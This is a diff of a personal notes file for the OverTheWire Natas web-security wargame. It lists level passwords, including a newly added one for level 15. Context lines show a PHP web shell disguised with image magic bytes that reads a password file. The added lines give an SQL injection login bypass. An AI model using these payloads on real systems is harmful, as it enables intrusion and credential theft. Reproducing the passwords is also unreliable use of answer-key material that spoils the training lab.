@@ -1,5 +1,8 @@
 # Flags
 
+## URL Format:
+http://natas0.natas.labs.overthewire.org
+
 ## Passwords:
 **natas0:**  natas0  
 **natas1:**  gtVrDuiDfck831PqWsLEZy5gyDz1clto  
@@ -15,7 +18,8 @@
 **natas11:** U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK  
 **natas12:** EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3  
 **natas13:** jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
-**natas14**: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+**natas14:** Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+**natas15:** AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  
 
 ## Brief Explainations:
 **0:** http://natas0.natas.labs.overthewire.org  
@@ -81,3 +85,9 @@ So the complete file in hex (with the magic numbers prepended) would be:
 ```
 ����<?php $results = exec('cat /etc/natas_webpass/natas14'); print($results);?>
 ```
+
+**14 -> 15:** A very straight-forward and simple SQL injection attack. Fun fact,
+for some reason -- does not work for commenting but # does.  
+Username: " or 1; #  
+password: lite  
+
